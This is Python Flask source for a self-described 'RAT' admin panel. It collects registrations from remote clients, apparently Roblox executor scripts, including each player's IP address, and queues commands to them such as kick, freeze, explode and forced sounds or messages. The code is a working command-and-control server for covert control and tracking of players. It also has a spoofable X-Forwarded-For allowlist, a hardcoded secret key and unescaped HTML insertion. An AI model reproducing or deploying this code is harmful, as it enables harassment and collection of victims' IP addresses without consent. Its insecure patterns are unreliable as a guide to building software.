from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "super_secret_key_ oxydal_99"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# Liste des IPs autorisées
ALLOWED_IPS = {"37.66.149.36", "91.170.86.224", "127.0.0.1"}

connected_players = {}
pending_kicks = {}
pending_commands = {}

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    return "<h1>Accès refusé</h1><p>IP non autorisée.</p>", 403

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll"]:
        check_ip()

HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Oxydal Rat | Admin</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;min-height:100vh;display:flex;overflow:hidden}

/* SIDEBAR */
.sidebar {width:260px; background:rgba(10,10,10,0.95); border-right:1px solid #333; display:flex; flex-direction:column; padding:25px; z-index:100}
.sidebar h2 {font-family:Orbitron; color:#00ffaa; font-size:1.4rem; margin-bottom:40px; text-align:center; text-shadow:0 0 15px #00ffaa}
.nav-btn {background:none; border:none; color:#aaa; padding:15px; text-align:left; font-size:1.1rem; cursor:pointer; border-radius:12px; transition:0.3s; margin-bottom:12px; font-weight:600}
.nav-btn:hover {background:rgba(255,255,255,0.05); color:#fff}
.nav-btn.active {background:rgba(0,255,170,0.1); color:#00ffaa; border-left:4px solid #00ffaa}

.main-content {flex:1; overflow-y:auto; padding:40px; position:relative}
.page {display:none}
.page.active {display:block}

.container{max-width:1200px;margin:auto}
h1{font-family:Orbitron;font-size:3.5rem;text-align:center;color:#00ffaa;text-shadow:0 0 30px #00ffaa;margin-bottom:20px}
.stats{text-align:center;margin:30px 0;font-size:1.8rem}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:25px}
.card{background:rgba(20,20,20,.9);border-radius:18px;padding:25px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:transform .3s; border:1px solid #222}
.card:hover{transform:translateY(-8px)}
.status{display:flex;align-items:center;gap:10px;margin-bottom:15px}
.dot{width:14px;height:14px;border-radius:50%;background:red;box-shadow:0 0 12px red}
.dot.online{background:#00ffaa;box-shadow:0 0 18px #00ffaa}
.name{font-size:1.8rem;font-weight:600;color:#ffcc00;margin-bottom:10px}
.name a{color:#ffcc00;text-decoration:none}
.info{font-size:1rem;color:#aaa;margin-bottom:20px;line-height:1.5}
.category{font-weight:bold;color:#00ffaa;margin:15px 0 10px;font-size:1.1rem}
button.kick-btn{padding:12px;border:none;border-radius:12px;cursor:pointer;font-weight:bold;font-size:0.95rem;color:white;transition:transform .2s;margin-bottom:8px}
button.kick-btn:hover{transform:scale(1.05)}

.history-item {background:rgba(30,30,30,0.5); padding:15px; border-radius:12px; margin-bottom:10px; border-left:5px solid #444; display:flex; justify-content:space-between; align-items:center}
.history-item.connect {border-color:#00ffaa}
.history-item.disconnect {border-color:#ff3366}
.history-item.action {border-color:#ffcc00}
.history-time {color:#666; font-size:0.8rem; font-family:monospace}

.modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);align-items:center;justify-content:center;z-index:1000}
.modal.active{display:flex}
.modal-content{background:#111;padding:30px;border-radius:20px;width:90%;max-width:500px;box-shadow:0 0 40px rgba(255,51,102,0.5)}
.modal-content h2{text-align:center;color:#ff3366;margin-bottom:20px}
.modal-content input{width:100%;padding:15px;border-radius:12px;border:none;background:#222;color:white;font-size:1.1rem;margin-bottom:20px}
.modal-buttons{display:flex;gap:15px}
.modal-buttons button{flex:1;padding:14px;border:none;border-radius:12px;font-weight:bold;cursor:pointer}

.toast-container{position:fixed;bottom:25px;right:25px;z-index:999}
.toast{background:#111;border-left:5px solid #00ffaa;padding:15px 20px;margin-top:12px;border-radius:10px}
</style>
</head>
<body>

<div class="sidebar">
    <h2>OXYDAL RAT</h2>
    <button class="nav-btn active" onclick="showPage('playersPage', this)">Players</button>
    <button class="nav-btn" onclick="showPage('historyPage', this)">History</button>
</div>

<div class="main-content">
    <div id="playersPage" class="page active">
        <div class="container">
            <h1>Oxydal Rat</h1>
            <div class="stats" id="stats">Players online: <b>0</b></div>
            <div class="grid" id="players"></div>
        </div>
    </div>

    <div id="historyPage" class="page">
        <div class="container">
            <h1>History Logs</h1>
            <div style="text-align:right; margin-bottom:20px;">
                <button class="kick-btn" style="background:#444" onclick="document.getElementById('historyList').innerHTML=''">Clear History</button>
            </div>
            <div id="historyList"></div>
        </div>
    </div>
</div>

<div class="modal" id="kickModal"><div class="modal-content"><h2>Kick</h2><input type="text" id="kickReason" placeholder="Reason..."><div class="modal-buttons"><button class="kick-btn" style="background:#444" onclick="closeModal('kickModal')">Cancel</button><button class="kick-btn" style="background:#ff3366" onclick="performKick()">Confirm</button></div></div></div>
<div class="modal" id="soundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundId" placeholder="Asset ID..."><div class="modal-buttons"><button class="kick-btn" style="background:#444" onclick="closeModal('soundModal')">Cancel</button><button class="kick-btn" style="background:orange" onclick="performSound()">Confirm</button></div></div></div>
<div class="modal" id="msgModal"><div class="modal-content"><h2>Display Message</h2><input type="text" id="msgText" placeholder="Salut / Test..."><div class="modal-buttons"><button class="kick-btn" style="background:#444" onclick="closeModal('msgModal')">Cancel</button><button class="kick-btn" style="background:#00ffff; color:black" onclick="performMsg()">Confirm</button></div></div></div>

<div class="toast-container" id="toasts"></div>

<script>
const socket = io();
let targetId = null;

function showPage(pageId, btn) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
    document.getElementById(pageId).classList.add('active');
    btn.classList.add('active');
}

function addLog(msg, type) {
    const list = document.getElementById("historyList");
    const item = document.createElement("div");
    item.className = `history-item ${type}`;
    item.innerHTML = `<span>${msg}</span><span class="history-time">${new Date().toLocaleTimeString()}</span>`;
    list.prepend(item);
}

function openModal(id, uid) { targetId = uid; document.getElementById(id).classList.add('active'); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); }

function performKick() {
    const r = document.getElementById("kickReason").value || "Kicked";
    fetch("/kick", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: targetId, reason: r})});
    closeModal('kickModal');
}
function performSound() {
    const s = document.getElementById("soundId").value;
    if(s) sendTroll(targetId, "playsound", s);
    closeModal('soundModal');
}
function performMsg() {
    const t = document.getElementById("msgText").value;
    if(t) sendTroll(targetId, "message", t);
    closeModal('msgModal');
}

function sendTroll(id, cmd, assetId = null) {
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: id, cmd: cmd, assetId: assetId})});
}

function render(data) {
    document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b> / ${data.total}`;
    const grid = document.getElementById("players");
    const currentIds = new Set(Object.keys(data.players));
    
    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById(`card_${id}`);
        if (!card) {
            card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card);
            addLog(`Connect: ${p.username}`, "connect");
        }

        card.innerHTML = `
            <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
            <div class="name">${p.username}</div>
            <div class="info">Executor: ${p.executor}<br>Game: ${p.game}</div>
            <div class="category">TROLLS</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                <button class="kick-btn" style="background:#ff3366;" onclick="openModal('kickModal','${id}')">KICK</button>
                <button class="kick-btn" style="background:#ff00ff;" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="kick-btn" style="background:#00ffff;" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="kick-btn" style="background:#ffff00; color:black" onclick="sendTroll('${id}','jump')">JUMP</button>
                <button class="kick-btn" style="background:#88ff88; color:black" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="kick-btn" style="background:#ff5555;" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button class="kick-btn" style="background:#5555ff;" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                <button class="kick-btn" style="background:orange;" onclick="openModal('soundModal','${id}')">SOUND</button>
                <button class="kick-btn" style="background:#00ffff; color:black; grid-column: span 2;" onclick="openModal('msgModal','${id}')">MESSAGE (REPLACE)</button>
            </div>
            <div class="category">UNDO</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                <button class="kick-btn" style="background:#444;" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                <button class="kick-btn" style="background:#444;" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                <button class="kick-btn" style="background:#444;" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
                <button class="kick-btn" style="background:#444;" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
            </div>
        `;
    });
    
    document.querySelectorAll('.card').forEach(c => {
        const id = c.id.replace('card_', '');
        if (!currentIds.has(id)) {
            addLog(`Disconnect: ${id}`, "disconnect");
            c.remove();
        }
    });
}

socket.on("update", render);
socket.on("kick_notice", d => {
    addLog(`Action: ${d.username} | ${d.reason}`, "action");
});
</script>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        d = request.get_json(silent=True) or {}
        uid = str(d.get("userid", ""))
        if d.get("action") == "register":
            connected_players[uid] = {
                "username": d.get("username", "Unknown"),
                "executor": d.get("executor", "Unknown"),
                "ip": d.get("ip", "Unknown"),
                "last": now,
                "online": True,
                "game": d.get("game", "Unknown")
            }
        elif d.get("action") == "heartbeat" and uid in connected_players:
            connected_players[uid]["last"] = now
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if uid in pending_kicks:
            return jsonify({"command": "kick", "reason": pending_kicks.pop(uid)})
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            return jsonify(cmd if isinstance(cmd, dict) else {"command": cmd})
        return jsonify({})

@app.route("/kick", methods=["POST"])
def kick():
    check_ip()
    d = request.get_json()
    uid, r = str(d.get("userid")), d.get("reason")
    pending_kicks[uid] = r
    socketio.emit("kick_notice", {"username": uid, "reason": f"KICK: {r}"})
    return jsonify({"ok": True})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    d = request.get_json()
    uid, cmd, asset = str(d.get("userid")), d.get("cmd"), d.get("assetId")
    pending_commands[uid] = {"command": cmd, "assetId": asset}
    socketio.emit("kick_notice", {"username": uid, "reason": cmd.upper()})
    return jsonify({"ok": True})

def broadcast_loop():
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in connected_players.items():
            if now - p["last"] > 30: to_remove.append(uid)
            else:
                p["online"] = now - p["last"] < 15
                if p["online"]: online += 1
        for uid in to_remove: connected_players.pop(uid, None)
        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
